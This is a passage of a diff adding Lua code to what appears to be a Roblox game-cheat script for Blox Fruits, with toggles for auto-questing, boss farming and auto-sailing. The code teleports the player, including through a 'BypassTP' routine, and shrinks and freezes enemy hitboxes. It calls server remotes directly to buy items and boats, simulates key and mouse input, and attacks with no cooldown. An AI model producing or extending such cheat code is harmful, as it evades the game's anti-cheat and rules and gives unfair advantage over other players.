+				elseif (game:GetService("Workspace")).Enemies:FindFirstChild("Soul Reaper") or game.ReplicatedStorage:FindFirstChild("Soul Reaper [Lv. 2100] [Raid Boss]") then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Soul Reaper") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Soul Reaper" then
+								if v.Humanoid.Health > 0 then
+									repeat
+										wait();
+										topos(v.HumanoidRootPart.CFrame * Pos);
+									until Auto_Cursed_Dual_Katana == false or Auto_Quest_Yama_3 == false or (game:GetService("Workspace")).Map:FindFirstChild("HellDimension");
+								end;
+							end;
+						end;
+					else
+						topos(CFrame.new(-9570.033203125, 315.9346923828125, 6726.89306640625));
+					end;
+				else
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1);
+				end;
+			end);
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		if Auto_Quest_Tushita_1 then
+			topos(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125));
+			wait(5);
+			topos(CFrame.new(-6120.0576171875, 16.455780029296875, -2250.697265625));
+			wait(5);
+			topos(CFrame.new(-9533.2392578125, 7.254445552825928, -8372.69921875));
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		if Auto_Quest_Tushita_2 then
+			pcall(function()
+				if ((CFrame.new((-5539.3115234375), 313.800537109375, (-2972.372314453125))).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 500 then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if Auto_Quest_Tushita_2 and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+							if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 2000 then
+								repeat
+									wait();
+									EquipWeapon(Sword);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+									v.HumanoidRootPart.Transparency = 1;
+									v.Humanoid.JumpPower = 0;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.CanCollide = false;
+									PosMon = v.HumanoidRootPart.CFrame;
+									MonFarm = v.Name;
+									Click();
+									if v.Humanoid.Health <= 0 and v.Humanoid:FindFirstChild("Animator") then
+										v.Humanoid.Animator:Destroy();
+									end;
+								until v.Humanoid.Health <= 0 or (not v.Parent) or Auto_Quest_Tushita_2 == false;
+							end;
+						end;
+					end;
+				else
+					topos(CFrame.new(-5545.1240234375, 313.800537109375, -2976.616455078125));
+				end;
+			end);
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		if Auto_Quest_Tushita_3 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Queen") or game.ReplicatedStorage:FindFirstChild("Cake Queen [Lv. 2175] [Boss]") then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Queen") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Cake Queen" then
+								if v.Humanoid.Health > 0 then
+									repeat
+										wait();
+										EquipWeapon(Sword);
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+										v.HumanoidRootPart.Transparency = 1;
+										v.Humanoid.JumpPower = 0;
+										v.Humanoid.WalkSpeed = 0;
+										v.HumanoidRootPart.CanCollide = false;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										Click();
+										if v.Humanoid.Health <= 0 and v.Humanoid:FindFirstChild("Animator") then
+											v.Humanoid.Animator:Destroy();
+										end;
+									until Auto_Cursed_Dual_Katana == false or Auto_Quest_Tushita_3 == false or (game:GetService("Workspace")).Map:FindFirstChild("HeavenlyDimension");
+								end;
+							end;
+						end;
+					else
+						topos(CFrame.new(-709.3132934570312, 381.6005859375, -11011.396484375));
+					end;
+				elseif (game:GetService("Workspace")).Map:FindFirstChild("HeavenlyDimension") then
+					repeat
+						wait();
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200]") or (game:GetService("Workspace")).Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200] [Boss]") or (game:GetService("Workspace")).Enemies:FindFirstChild("Heaven's Guardian [Lv. 2200] [Boss]") then
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == "Cursed Skeleton" or v.Name == "Cursed Skeleton" or v.Name == "Heaven's Guardian" then
+									if v.Humanoid.Health > 0 then
+										repeat
+											wait();
+											EquipWeapon(Sword);
+											topos(v.HumanoidRootPart.CFrame * Pos);
+											v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+											v.HumanoidRootPart.Transparency = 1;
+											v.Humanoid.JumpPower = 0;
+											v.Humanoid.WalkSpeed = 0;
+											v.HumanoidRootPart.CanCollide = false;
+											PosMon = v.HumanoidRootPart.CFrame;
+											MonFarm = v.Name;
+											Click();
+											if v.Humanoid.Health <= 0 and v.Humanoid:FindFirstChild("Animator") then
+												v.Humanoid.Animator:Destroy();
+											end;
+										until v.Humanoid.Health <= 0 or (not v.Parent) or Auto_Quest_Tushita_3 == false;
+									end;
+								end;
+							end;
+						else
+							wait(5);
+							topos((game:GetService("Workspace")).Map.HeavenlyDimension.Torch1.CFrame);
+							wait(1.5);
+							(game:GetService("VirtualInputManager")):SendKeyEvent(true, "E", false, game);
+							wait(1.5);
+							topos((game:GetService("Workspace")).Map.HeavenlyDimension.Torch2.CFrame);
+							wait(1.5);
+							(game:GetService("VirtualInputManager")):SendKeyEvent(true, "E", false, game);
+							wait(1.5);
+							topos((game:GetService("Workspace")).Map.HeavenlyDimension.Torch3.CFrame);
+							wait(1.5);
+							(game:GetService("VirtualInputManager")):SendKeyEvent(true, "E", false, game);
+							wait(1.5);
+							topos((game:GetService("Workspace")).Map.HeavenlyDimension.Exit.CFrame);
+						end;
+					until not Auto_Cursed_Dual_Katana or (not Auto_Quest_Tushita_3) or GetMaterial("Alucard Fragment") == 6;
+				end;
+			end);
+		end;
+	end;
+end);
+ItemsTab:Toggle("Auto Get Tushita", _G.Autotushita, "Need Spawn Longma and Rip Indra", function(value)
+	_G.Autotushita = value;
+	StopTween(_G.Autotushita);
+end);
+spawn(function()
+	while wait() do
+		if _G.Autotushita and World3 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra True Form") then
+					ripIndraSpawn = true;
+				elseif (game:GetService("Workspace")).Enemies:FindFirstChild("Longma") then
+					longmaSpawn = true;
+				end;
+				if not (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra True Form") or (not (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra")) then
+					repeat
+						wait(1);
+						Alert:create("Rip Indra Not Spawn");
+					until not _G.Autotushita or (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra True Form") or (not (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra"));
+				elseif not (game:GetService("Workspace")).Enemies:FindFirstChild("Longma") then
+					repeat
+						wait(1);
+						Alert:create("Longma Not Spawn");
+					until not _G.Autotushita or (game:GetService("Workspace")).Enemies:FindFirstChild("Longma");
+				end;
+				if ripIndraSpawn and longmaSpawn then
+					topos(CFrame.new(5154.85303, 141.812225, 913.080933, 0.138356507, 0.0000000517637666, 0.990382493, 0.0000000459496796, 1, -0.0000000586856146, -0.990382493, 0.0000000536272928, 0.138356507));
+					if ((CFrame.new(5154.85303, 141.812225, 913.080933, 0.138356507, 0.0000000517637666, 0.990382493, 0.0000000459496796, 1, (-0.0000000586856146), (-0.990382493), 0.0000000536272928, 0.138356507)).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude < 2 then
+						wait(2);
+						Torch = true;
+					end;
+				end;
+				local Torch1CFrame = (game:GetService("Workspace")).Map.Turtle.QuestTorches.Torch1.Particles.CFrame;
+				local Torch2CFrame = (game:GetService("Workspace")).Map.Turtle.QuestTorches.Torch2.Particles.CFrame;
+				local Torch3CFrame = (game:GetService("Workspace")).Map.Turtle.QuestTorches.Torch3.Particles.CFrame;
+				local Torch4CFrame = (game:GetService("Workspace")).Map.Turtle.QuestTorches.Torch4.Particles.CFrame;
+				local Torch5CFrame = (game:GetService("Workspace")).Map.Turtle.QuestTorches.Torch5.Particles.CFrame;
+				if Torch then
+					topos(Torch1CFrame);
+					if (Torch1CFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude < 2 then
+						wait(1);
+						Torch1 = true;
+					end;
+					if Torch1 then
+						topos(Torch2CFrame);
+						if (Torch2CFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude < 2 then
+							wait(1);
+							Torch2 = true;
+						end;
+					end;
+					if Torch2 then
+						topos(Torch3CFrame);
+						if (Torch3CFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude < 2 then
+							wait(1);
+							Torch3 = true;
+						end;
+					end;
+					if Torch3 then
+						topos(Torch4CFrame);
+						if (Torch4CFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude < 2 then
+							wait(1);
+							Torch4 = true;
+						end;
+					end;
+					if Torch4 then
+						topos(Torch5CFrame);
+						if (Torch5CFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude < 2 then
+							wait(1);
+							Torch5 = true;
+						end;
+					end;
+					if Torch5 then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Longma" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not _G.Autotushita or (not v.Parent) or (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Tushita") or v.Humanoid.Health <= 0;
+								end;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+ItemsTab:Toggle("Auto Carvander", _G.AutoCarvender, false, function(value)
+	_G.AutoCarvender = value;
+	StopTween(_G.AutoCarvender);
+end);
+local CavandisPos = CFrame.new(5311.07421875, 426.0243835449219, 165.12762451171875);
+spawn(function()
+	while wait() do
+		if _G.AutoCarvender and World3 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Beautiful Pirate") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Beautiful Pirate" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait();
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									(game:GetService("VirtualUser")):CaptureController();
+									(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+								until not _G.AutoCarvender or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				else
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CavandisPos.Position).Magnitude > 1500 then
+							BTP(CavandisPos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CavandisPos.Position).Magnitude < 1500 then
+							topos(CavandisPos);
+						end;
+					else
+						topos(CavandisPos);
+					end;
+					UnEquipWeapon(_G.SelectWeapon);
+					topos(CFrame.new(5311.07421875, 426.0243835449219, 165.12762451171875));
+					if (game:GetService("ReplicatedStorage")):FindFirstChild("Beautiful Pirate") then
+						topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Beautiful Pirate")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+SeaTab:Seperator("Sea");
+local ListSeaBoat = {
+	"Guardian",
+	"PirateGrandBrigade",
+	"MarineGrandBrigade",
+	"PirateBrigade",
+	"MarineBrigade",
+	"PirateSloop",
+	"MarineSloop",
+	"BeastHunter"
+};
+local ListSeaZone = {
+	"Zone 1",
+	"Zone 2",
+	"Zone 3",
+	"Zone 4",
+	"Zone 5",
+	"Zone 6",
+	"Infinite"
+};
+_G.SelectedBoat = "Guardian";
+SeaTab:Dropdown("Select Boat", ListSeaBoat, _G.SelectedBoat, function(x)
+	_G.SelectedBoat = x;
+end);
+_G.SelectedZone = "Zone 5";
+SeaTab:Dropdown("Select Zone", ListSeaZone, _G.SelectedZone, function(x)
+	_G.SelectedZone = x;
+end);
+BoatSpeed = 300;
+SeaTab:Slider("Boat Tween Speed", 100, 350, BoatSpeed, function(v)
+	BoatSpeed = v;
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.SelectedZone == "Zone 1" then
+				CFrameSelectedZone = CFrame.new(-21998.375, 30.0006084, -682.309143, 0.120013528, 0.00690158736, 0.99274826, -0.0574118942, 0.998350561, -0.000000000236509201, -0.991110802, -0.0569955558, 0.120211802);
+			elseif _G.SelectedZone == "Zone 2" then
+				CFrameSelectedZone = CFrame.new(-26779.5215, 30.0005474, -822.858032, 0.307457417, 0.019647358, 0.951358974, -0.0637726262, 0.997964442, -0.000000000415334017, -0.949422479, -0.0606706589, 0.308084518);
+			elseif _G.SelectedZone == "Zone 3" then
+				CFrameSelectedZone = CFrame.new(-31171.957, 30.0001011, -2256.93774, 0.37637493, 0.0150483791, 0.926345229, -0.0399504974, 0.999201655, 0.0000000000270896673, -0.925605655, -0.0370079502, 0.376675636);
+			elseif _G.SelectedZone == "Zone 4" then
+				CFrameSelectedZone = CFrame.new(-34054.6875, 30.2187767, -2560.12012, 0.0935864747, -0.00122954219, 0.995610416, 0.0624034069, 0.998040259, -0.00463332096, -0.993653536, 0.062563099, 0.0934797972);
+			elseif _G.SelectedZone == "Zone 5" then
+				CFrameSelectedZone = CFrame.new(-38887.5547, 30.0004578, -2162.99023, -0.188895494, -0.00704088295, 0.981971979, -0.0372481011, 0.999306023, -0.00000000139882339, -0.981290519, -0.0365765914, -0.189026669);
+			elseif _G.SelectedZone == "Zone 6" then
+				CFrameSelectedZone = CFrame.new(-44541.7617, 30.0003204, -1244.8584, -0.0844199061, -0.00553312758, 0.9964149, -0.0654025897, 0.997858942, 0.000000000202319411, -0.99428153, -0.0651681125, -0.0846010372);
+			elseif _G.SelectedZone == "Infinite" then
+				CFrameSelectedZone = CFrame.new(-148073.359, 8.99999523, 7721.05078, -0.0825930536, -0.00000154416148, 0.996583343, -0.000018696026, 1, -0.000000000000391858095, -0.996583343, -0.0000186321486, -0.0825930536);
+			end;
+		end;
+	end);
+end);
+SeaTab:Toggle("Auto Sail Boat", _G.SailBoat, "Sail Boat", function(state)
+	_G.SailBoat = state;
+	StopTween(_G.SailBoat);
+	stopboat:Stop();
+end);
+function CheckBoat()
+	for i, v in pairs((game:GetService("Workspace")).Boats:GetChildren()) do
+		if v.Name == _G.SelectedBoat then
+			for _, child in pairs(v:GetChildren()) do
+				if child.Name == "MyBoatEsp" then
+					return v;
+				end;
+			end;
+		end;
+	end;
+	return false;
+end;
+function CheckEnemiesBoat()
+	if (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") or (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") or (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") then
+		return true;
+	end;
+	return false;
+end;
+function CheckShark()
+	for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+		if v.Name == "Shark" and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+			if (game:GetService("Workspace")).Enemies:FindFirstChild("Shark") then
+				if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 200 then
+					return true;
+				end;
+			end;
+		end;
+	end;
+	return false;
+end;
+function CheckPiranha()
+	for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+		if v.Name == "Piranha" and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+			if (game:GetService("Workspace")).Enemies:FindFirstChild("Piranha") then
+				if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 200 then
+					return true;
+				end;
+			end;
+		end;
+	end;
+	return false;
+end;
+function AddEsp(Name, Parent)
+	local BillboardGui = Instance.new("BillboardGui");
+	local TextLabel = Instance.new("TextLabel");
+	BillboardGui.Parent = Parent;
+	BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+	BillboardGui.Active = true;
+	BillboardGui.Name = Name;
+	BillboardGui.AlwaysOnTop = true;
+	BillboardGui.LightInfluence = 1;
+	BillboardGui.Size = UDim2.new(0, 200, 0, 50);
+	BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0);
+	TextLabel.Parent = BillboardGui;
+	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+	TextLabel.BackgroundTransparency = 1;
+	TextLabel.Size = UDim2.new(1, 0, 1, 0);
+	TextLabel.Font = Enum.Font.GothamBold;
+	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
+	TextLabel.TextSize = 15;
+	TextLabel.Text = "MyBoat";
+end;
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.SailBoat then
+				if not CheckBoat() then
+					local BuyBoatCFrame = CFrame.new(-16927.451171875, 9.0863618850708, 433.8642883300781);
+					if (BuyBoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
+						BTP(BuyBoatCFrame);
+					else
+						buyb = TPP(BuyBoatCFrame);
+					end;
+					if ((CFrame.new((-16927.451171875), 9.0863618850708, 433.8642883300781)).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
+						if buyb then
+							buyb:Stop();
+						end;
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat);
+						for i, v in pairs((game:GetService("Workspace")).Boats:GetChildren()) do
+							if v.Name == _G.SelectedBoat then
+								if (v.VehicleSeat.CFrame.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
+									AddEsp("MyBoatEsp", v);
+								end;
+							end;
+						end;
+					end;
+				elseif CheckBoat() then
+					for i, v in pairs((game:GetService("Workspace")).Boats:GetChildren()) do
+						if v.Name == _G.SelectedBoat then
+							if v:FindFirstChild("MyBoatEsp") then
+								if (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == false then
+									if CheckShark() and _G.AutoKillShark or (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") and _G.AutoTerrorshark or CheckPiranha() and _G.AutoKillPiranha or (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") and _G.AutoKillFishCrew or (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") and _G.RelzFishBoat or (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") and _G.RelzPirateBrigade or (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") and _G.RelzPirateGrandBrigade or CheckSeaBeast() and _G.AutoSeaBest then
+										if stoppos then
+											stoppos:Stop();
+										end;
+									else
+										local stoppos = topos(v.VehicleSeat.CFrame * CFrame.new(0, 1, 0));
+									end;
+								else
+									repeat
+										wait();
+										local stopboat = TPB(CFrameSelectedZone, v.VehicleSeat);
+									until CheckShark() and _G.AutoKillShark or (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") and _G.AutoTerrorshark or CheckPiranha() and _G.AutoKillPiranha or (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") and _G.AutoKillFishCrew or (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") and _G.RelzFishBoat or (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") and _G.RelzPirateBrigade or (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") and _G.RelzPirateGrandBrigade or CheckSeaBeast() and _G.AutoSeaBest or (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == false or _G.SailBoat == false;
+									if stopboat then
+										stopboat:Stop();
+									end;
+									(game:GetService("VirtualInputManager")):SendKeyEvent(true, 32, false, game);
+									wait(0.1);
+									(game:GetService("VirtualInputManager")):SendKeyEvent(false, 32, false, game);
+								end;
+							end;
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.SailBoat then
+				if CheckShark() and _G.AutoKillShark or (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") and _G.AutoTerrorshark or CheckPiranha() and _G.AutoKillPiranha or (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") and _G.AutoKillFishCrew or (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") and _G.RelzFishBoat or (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") and _G.RelzPirateBrigade or (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") and _G.RelzPirateGrandBrigade or CheckSeaBeast() and _G.AutoSeaBest then
+					if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
+						(game:GetService("VirtualInputManager")):SendKeyEvent(true, 32, false, game);
+						wait(0.1);
+						(game:GetService("VirtualInputManager")):SendKeyEvent(false, 32, false, game);
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.SailBoat then
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") and _G.AutoKillFishCrew then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") then
+							if v.Name == "Fish Crew Member" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait(_G.FastAttackDelay);
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										AttackNoCD();
+										_G.SeaSkill = false;
+									until not _G.AutoKillFishCrew or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					end;
+				elseif (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") and _G.RelzFishBoat then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") then
+							repeat
+								task.wait();
+								local BoatCFrame = v.Engine.CFrame;
+								if (BoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+									_G.SeaSkill = true;
+								else
+									_G.SeaSkill = false;
+								end;
+								topos(BoatCFrame);
+								Skillaimbot = true;
+								AimSkill = v.Engine.CFrame * CFrame.new(0, (-15), 0);
+								AimBotSkillPosition = AimSkill.Position;
+							until not v.Parent or v.Health < 0 or (not (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat")) or (not v:FindFirstChild("Engine")) or (not _G.RelzFishBoat);
+							Skillaimbot = false;
+							_G.SeaSkill = false;
+						end;
+					end;
+				elseif (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") and _G.RelzPirateGrandBrigade then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") then
+							repeat
+								task.wait();
+								local BoatCFrame = v.Engine.CFrame;
+								if (BoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+									_G.SeaSkill = true;
+								else
+									_G.SeaSkill = false;
+								end;
+								topos(BoatCFrame);
+								Skillaimbot = true;
+								AimSkill = v.Engine.CFrame * CFrame.new(0, (-15), 0);
+								AimBotSkillPosition = AimSkill.Position;
+							until not v.Parent or v.Health.Value < 0 or (not (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade")) or (not v:FindFirstChild("Engine")) or (not _G.RelzPirateGrandBrigade);
+							Skillaimbot = false;
+							_G.SeaSkill = false;
+						end;
+					end;
+				elseif (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") and _G.RelzPirateBrigade then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") then
+							repeat
+								task.wait();
+								local BoatCFrame = v.Engine.CFrame;
+								if (BoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+									_G.SeaSkill = true;
+								else
+									_G.SeaSkill = false;
+								end;
+								topos(BoatCFrame);
+								Skillaimbot = true;
+								AimSkill = v.Engine.CFrame * CFrame.new(0, (-15), 0);
+								AimBotSkillPosition = AimSkill.Position;
+							until not v.Parent or v.Health.Value < 0 or (not (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade")) or (not v:FindFirstChild("Engine")) or (not _G.RelzPirateBrigade);
+							Skillaimbot = false;
+							_G.SeaSkill = false;
+						end;
+					end;
+				elseif CheckSeaBeast() and _G.AutoSeaBest then
+					if (game:GetService("Workspace")):FindFirstChild("SeaBeasts") then
+						for i, v in pairs((game:GetService("Workspace")).SeaBeasts:GetChildren()) do
+							if CheckSeaBeast() then
+								repeat
+									wait();
+									CFrameSeaBeast = v.HumanoidRootPart.CFrame * CFrame.new(0, 200, 0);
+									if (CFrameSeaBeast.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude <= 200 then
+										_G.SeaSkill = true;
+									else
+										_G.SeaSkill = false;
+									end;
+									Skillaimbot = true;
+									AimBotSkillPosition = v.HumanoidRootPart.CFrame.Position;
+									topos(CFrameSeaBeast * Pos);
+								until not _G.AutoSeaBest or CheckSeaBeast() == false or (not v:FindFirstChild("Humanoid")) or (not v:FindFirstChild("HumanoidRootPart")) or v.Humanoid.Health < 0 or (not v.Parent);
+								Skillaimbot = false;
+								_G.SeaSkill = false;
+							else
+								Skillaimbot = false;
+								_G.SeaSkill = false;
+							end;
+						end;
+					end;
+				elseif (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") and _G.AutoTerrorshark then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") then
+							if v.Name == "Terrorshark" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait(0.15);
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										AttackNoCD();
+										_G.SeaSkill = false;
+										topos(v.HumanoidRootPart.CFrame * CFrame.new(0, 60, 0));
+									until not _G.AutoTerrorshark or (not v.Parent) or v.Humanoid.Health <= 0;
+								end;
+							end;
+						end;
+					end;
+				elseif CheckPiranha() and _G.AutoKillPiranha then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Piranha") then
+							if v.Name == "Piranha" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait(_G.FastAttackDelay);
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										AttackNoCD();
+										_G.SeaSkill = false;
+									until not _G.AutoKillPiranha or (not v.Parent) or v.Humanoid.Health <= 0;
+								end;
+							end;
+						end;
+					end;
+				elseif CheckShark() and _G.AutoKillShark then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Shark") then
+							if v.Name == "Shark" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait(_G.FastAttackDelay);
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										AttackNoCD();
+										_G.SeaSkill = false;
+									until not _G.AutoKillShark or (not v.Parent) or v.Humanoid.Health <= 0;
+								end;
+							end;
+						end;
+					end;
+				else
+					Skillaimbot = false;
+					_G.SeaSkill = false;
+					UnEquipWeapon(_G.SelectWeapon);
+				end;
+			end;
+		end);
+	end;
+end);
+SeaTab:Toggle("Auto Farm Shark", _G.AutoKillShark, "Auto Kill Shark", function(value)
+	_G.AutoKillShark = value;
+	StopTween(_G.AutoKillShark);
+end);
+SeaTab:Toggle("Auto Farm Piranha", _G.AutoKillPiranha, "Auto Kill Piranha", function(value)
+	_G.AutoKillPiranha = value;
+	StopTween(_G.AutoKillPiranha);
+end);
+SeaTab:Toggle("Auto Farm Fish Crew", _G.AutoKillFishCrew, "Auto Kill Fish Crew Member", function(value)
+	_G.AutoKillFishCrew = value;
+	StopTween(_G.AutoKillFishCrew);
+end);
+function UpDownPos(pos)
